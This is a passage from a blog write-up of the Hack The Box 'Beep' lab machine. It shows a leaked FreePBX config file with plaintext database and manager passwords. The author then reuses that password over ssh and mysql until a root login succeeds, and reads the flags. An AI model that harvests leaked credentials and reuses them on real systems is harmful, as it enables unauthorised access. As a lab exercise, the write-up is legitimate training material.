+# CDRDBTABLENAME: Name of the table in the db where the cdr is stored cdr is default 
+
+# AMPVMUMASK=mask 
+# DEFAULT VALUE: 077 
+# Defaults to 077 allowing only the asterisk user to have any permission on VM files. If set to something
+# like 007, it would allow the group to have permissions. This can be used if setting apache to a different
+# user then asterisk, so that the apache user (and thus ARI) can have access to read/write/delete the
+# voicemail files. If changed, some of the voicemail directory structures may have to be manually changed.
+
+# DASHBOARD_STATS_UPDATE_TIME=integer_seconds
+# DEFAULT VALUE: 6
+# DASHBOARD_INFO_UPDATE_TIME=integer_seconds
+# DEFAULT VALUE: 20
+# These can be used to change the refresh rate of the System Status Panel. Most of
+# the stats are updated based on the STATS interval but a few items are checked
+# less frequently (such as Asterisk Uptime) based on the INFO value
+
+# ZAP2DAHDICOMPAT=true|false
+ZAP2DAHDICOMPAT=true
+# DEFAULT VALUE: false
+# If set to true, FreePBX will check if you have chan_dadhi installed. If so, it will
+# automatically use all your ZAP configuration settings (devices and trunks) and
+# silently convert them, under the covers, to DAHDI so no changes are needed. The
+# GUI will continue to refer to these as ZAP but it will use the proper DAHDI channels.
+# This will also keep Zap Channel DIDs working.
+
+# CHECKREFERER=true|false
+# DEFAULT VALUE: true
+# When set to the default value of true, all requests into FreePBX that might possibly add/edit/delete
+# settings will be validated to assure the request is coming from the server. This will protect the system
+# from CSRF (cross site request forgery) attacks. It will have the effect of preventing legitimately entering
+# URLs that could modify settings which can be allowed by changing this field to false.
+
+# USEQUEUESTATE=true|false
+# DEFAULT VALUE: false
+# Setting this flag will generate the required dialplan to integrate with the following Asterisk patch:
+# https://issues.asterisk.org/view.php?id=15168
+# This feature is planned for a future 1.6 release but given the existence of the patch can be used prior. Once
+# the release version is known, code will be added to automatically enable this format in versions of Asterisk
+# that support it.
+
+# USEGOOGLEDNSFORENUM=true|false
+# DEFAULT VALUE: false
+# Setting this flag will generate the required global variable so that enumlookup.agi will use Google DNS
+# 8.8.8.8 when performing an ENUM lookup. Not all DNS deals with NAPTR record, but Google does. There is a
+# drawback to this as Google tracks every lookup. If you are not comfortable with this, do not enable this
+# setting. Please read Google FAQ about this: http://code.google.com/speed/public-dns/faq.html#privacy
+
+# MOHDIR=subdirectory_name
+# This is the subdirectory for the MoH files/directories which is located in ASTVARLIBDIR
+# if not specified it will default to mohmp3 for backward compatibility.
+MOHDIR=mohmp3
+# RELOADCONFIRM=true|false
+# DEFAULT VALUE: true
+# When set to false, will bypass the confirm on Reload Box
+
+# FCBEEPONLY=true|false
+# DEFAULT VALUE: false
+# When set to true, a beep is played instead of confirmation message when activating/de-activating:
+# CallForward, CallWaiting, DayNight, DoNotDisturb and FindMeFollow
+
+# DISABLECUSTOMCONTEXTS=true|false
+# DEFAULT VALUE: false
+# Normally FreePBX auto-generates a custom context that may be usable for adding custom dialplan to modify the
+# normal behavior of FreePBX. It takes a good understanding of how Asterisk processes these includes to use
+# this and in many of the cases, there is no useful application. All includes will result in a WARNING in the
+# Asterisk log if there is no context found to include though it results in no errors. If you know that you
+# want the includes, you can set this to true. If you comment it out FreePBX will revert to legacy behavior
+# and include the contexts.
+
+# AMPMODULEXML lets you change the module repository that you use. By default, it
+# should be set to http://mirror.freepbx.org/ - Presently, there are no third
+# party module repositories.
+AMPMODULEXML=http://mirror.freepbx.org/
+
+# AMPMODULESVN is the prefix that is appended to &lt;location&gt; tags in the XML file.
+# This should be set to http://mirror.freepbx.org/modules/
+AMPMODULESVN=http://mirror.freepbx.org/modules/
+
+AMPDBNAME=asterisk
+
+ASTETCDIR=/etc/asterisk
+ASTMODDIR=/usr/lib/asterisk/modules
+ASTVARLIBDIR=/var/lib/asterisk
+ASTAGIDIR=/var/lib/asterisk/agi-bin
+ASTSPOOLDIR=/var/spool/asterisk
+ASTRUNDIR=/var/run/asterisk
+ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
+</pre> </div> </div> <p><br> Notice the credentials in the file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4222"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4222')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4222')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4222')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4222')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4222">
+
+&lt;snip&gt;
+
+AMPDBHOST=localhost
+AMPDBENGINE=mysql
+# AMPDBNAME=asterisk
+AMPDBUSER=asteriskuser
+# AMPDBPASS=amp109
+AMPDBPASS=jEhdIekWmdjE
+AMPENGINE=asterisk
+AMPMGRUSER=admin
+#AMPMGRPASS=amp111
+AMPMGRPASS=jEhdIekWmdjE
+
+&lt;snip&gt;
+
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4222" onclick="terminalOverlayClose('bash-bash-4222')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4222')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4222')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4222')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4222" data-language="bash">
+
+&lt;snip&gt;
+
+AMPDBHOST=localhost
+AMPDBENGINE=mysql
+# AMPDBNAME=asterisk
+AMPDBUSER=asteriskuser
+# AMPDBPASS=amp109
+AMPDBPASS=jEhdIekWmdjE
+AMPENGINE=asterisk
+AMPMGRUSER=admin
+#AMPMGRPASS=amp111
+AMPMGRPASS=jEhdIekWmdjE
+
+&lt;snip&gt;
+
+</pre> </div> </div> <p><br> Try to ssh into the machine with the credentials.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4669"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4669')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4669')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4669')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4669')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4669">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
+    -oHostKeyAlgorithms=+ssh-rsa \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
+&gt; asteriskuser@10.129.229.183
+
+The authenticity of host '10.129.229.183 (10.129.229.183)' can't be established.
+RSA key fingerprint is: SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.229.183' (RSA) to the list of known hosts.
+asteriskuser@10.129.229.183's password: 
+Permission denied, please try again.
+asteriskuser@10.129.229.183's password:
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4669" onclick="terminalOverlayClose('bash-bash-4669')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4669')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4669')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4669')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4669" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
+    -oHostKeyAlgorithms=+ssh-rsa \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
+&gt; asteriskuser@10.129.229.183
+
+The authenticity of host '10.129.229.183 (10.129.229.183)' can't be established.
+RSA key fingerprint is: SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.229.183' (RSA) to the list of known hosts.
+asteriskuser@10.129.229.183's password: 
+Permission denied, please try again.
+asteriskuser@10.129.229.183's password:
+</pre> </div> </div> <p><br> Try to authenticate into the database with the db credentials.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4316"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4316')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4316')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4316')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4316')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4316">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ mysql -h 10.129.229.183 -u asteriskuser -p 
+Enter password: 
+ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.120' is not allowed to connect to this MySQL server
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4316" onclick="terminalOverlayClose('bash-bash-4316')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4316')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4316')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4316')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4316" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ mysql -h 10.129.229.183 -u asteriskuser -p 
+Enter password: 
+ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.120' is not allowed to connect to this MySQL server
+</pre> </div> </div> <p><br> Try to ssh into the machine as root with the password from the config.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41052"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41052')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41052')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41052')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41052')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41052">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ mysql -h 10.129.229.183 -u asteriskuser -p 
+Enter password: 
+ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.120' is not allowed to connect to this MySQL server
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
+    -oHostKeyAlgorithms=+ssh-rsa \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
+root@10.129.229.183
+root@10.129.229.183's password: 
+Last login: Wed Nov 15 12:55:38 2023
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:
+http://10.129.229.183
+
+[root@beep ~]#
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41052" onclick="terminalOverlayClose('bash-bash-41052')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41052')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41052')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41052')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41052" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ mysql -h 10.129.229.183 -u asteriskuser -p 
+Enter password: 
+ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.120' is not allowed to connect to this MySQL server
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/htb/beep]
+└─$ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
+    -oHostKeyAlgorithms=+ssh-rsa \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa \
+root@10.129.229.183
+root@10.129.229.183's password: 
+Last login: Wed Nov 15 12:55:38 2023
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:
+http://10.129.229.183
+
+[root@beep ~]#
+</pre> </div> </div> <p><br> Get the user.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4415"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4415')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4415')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4415')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4415')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4415">
+[root@beep fanis]# cat user.txt 
+&lt;redacted&gt;
+[root@beep fanis]# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000
+    link/ether 00:50:56:b0:f0:f7 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.229.183/16 brd 10.129.255.255 scope global eth0
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4415" onclick="terminalOverlayClose('bash-bash-4415')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4415')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4415')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4415')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4415" data-language="bash">
+[root@beep fanis]# cat user.txt 
+&lt;redacted&gt;
+[root@beep fanis]# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000
+    link/ether 00:50:56:b0:f0:f7 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.229.183/16 brd 10.129.255.255 scope global eth0
+</pre> </div> </div> <p><br> Get the root.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4406"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4406')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4406')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4406')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4406')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4406">
+[root@beep ~]# cat root.txt
+&lt;redacted&gt;
+[root@beep ~]# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000
+    link/ether 00:50:56:b0:f0:f7 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.229.183/16 brd 10.129.255.255 scope global eth0
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4406" onclick="terminalOverlayClose('bash-bash-4406')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4406')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4406')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4406')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4406" data-language="bash">
+[root@beep ~]# cat root.txt
+&lt;redacted&gt;
+[root@beep ~]# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000
+    link/ether 00:50:56:b0:f0:f7 brd ff:ff:ff:ff:ff:ff
+    inet 10.129.229.183/16 brd 10.129.255.255 scope global eth0
+</pre> </div> </div> <p><br> And with that flag safely in the keep, we safely cracked Beep. Time to take the next one.</p> </article> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2026 Biscotti Diskette  ·  <a href="https://github.com/biscottidiskette" target="_blank" rel="external nofollow noopener">GitHub</a>  ·  <a href="https://app.hackthebox.eu/profile/biscottidiskette" target="_blank" rel="external nofollow noopener">HackTheBox</a>  ·  <a href="https://tryhackme.com/r/p/BiscottiDiskette" target="_blank" rel="external nofollow noopener">TryHackMe</a>  ·  <a href="/contact/">Contact</a> </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-HL7MJBJN7X"></script> <script defer src="/assets/js/google-analytics-setup.js?1c5d3b199be7049d4732e15d2072d0b2"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script src="/assets/js/terminal.js?ec2a38fba85ea4751db97d30059cd1c5"></script> </body> </html>
